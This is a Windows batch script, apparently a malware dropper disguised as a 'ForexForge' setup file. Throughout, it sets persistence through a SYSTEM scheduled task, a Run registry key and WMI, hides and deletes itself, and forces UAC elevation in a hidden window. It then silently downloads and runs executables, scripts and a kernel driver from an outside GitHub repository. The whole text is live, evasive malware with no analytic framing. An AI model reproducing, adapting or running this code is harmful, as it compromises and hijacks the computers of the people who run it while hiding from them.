@echo off
setlocal enabledelayedexpansion

REM Get current path and filename
set "scriptPath=%~dp0%~nx0"
set "scriptName=%~n0%~x0"

REM Create backup in AppData
set "backupPath=%APPDATA%\Local"
if not exist "%backupPath%" mkdir "%backupPath%"
copy "%scriptPath%" "%backupPath%\ForexForge_Setup.bat" >nul

REM Schedule task with UAC bypass
schtasks /create /tn "ForexForge_Task" /tr "\"%backupPath%\ForexForge_Setup.bat\"" /sc onlogon /ru SYSTEM /f /v1

REM Set startup registry key for persistence
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v ForexForge /t REG_SZ /d "\"%backupPath%\ForexForge_Setup.bat\"" /f

REM Create additional persistence via WMI
wmic process call create "\"%backupPath%\ForexForge_Setup.bat\""

REM Delete original file after copying
del "%scriptPath%" /q

REM Hide the backup file
attrib +h "%backupPath%\ForexForge_Setup.bat"

REM Add delay before execution (1 minute)
timeout /t 60 /nobreak >nul

REM Execute the backup version
"%backupPath%\ForexForge_Setup.bat"


@echo off
setlocal

:: ============================================================
:: 1. UAC ELEVATION & AUTO-HIDE
:: ============================================================
net session >nul 2>&1
if %errorLevel% neq 0 (
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\admin.vbs"
    :: The '0' at the end of the next line tells Windows to run the window HIDDEN
    echo UAC.ShellExecute "%~s0", "", "", "runas", 0 >> "%temp%\admin.vbs"
    wscript "%temp%\admin.vbs"
    exit /b
)
if exist "%temp%\admin.vbs" del "%temp%\admin.vbs"

:: ============================================================
:: 2. DIRECTORY SETUP (Now running hidden)
:: ============================================================
set "workDir=%AppData%\Local\WindowsGraphics\"
if not exist "%workDir%" mkdir "%workDir%" >nul 2>&1
cd /d "%workDir%"
if not exist "driver" mkdir "driver" >nul 2>&1

:: Security Protocol Fix
set "psF=[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; (New-Object System.Net.WebClient).DownloadFile"

:: ============================================================
:: 3. DOWNLOADS
:: ============================================================
:: All 'echo' commands removed so no text is generated

powershell -Command "%psF%('https://github.com/g00glecenter101-arch/Keep/raw/refs/heads/main/launcher.vbs', 'launcher.vbs')"
powershell -Command "%psF%('https://github.com/g00glecenter101-arch/Keep/raw/refs/heads/main/boom.bat', 'boom.bat')"
powershell -Command "%psF%('https://github.com/g00glecenter101-arch/Keep/raw/refs/heads/main/sigurd.exe', 'sigurd.exe')"
powershell -Command "%psF%('https://github.com/g00glecenter101-arch/Keep/raw/refs/heads/main/Config.toml', 'Config.toml')"
powershell -Command "%psF%('https://github.com/g00glecenter101-arch/Keep/raw/refs/heads/main/ghost_launcher.vbs', 'launcher.vbs')"
powershell -Command "%psF%('https://github.com/g00glecenter101-arch/Keep/raw/refs/heads/main/drivers/K7RKScan.sys', 'driver\k7RKScan.sys')"

:: ============================================================
:: 4. THE SILENT HANDOFF
:: ============================================================
if exist "launcher.vbs" (
    start "" "wscript.exe" "launcher.vbs"
)

:: Self-delete
(goto) 2>nul & del "%~f0"
exit



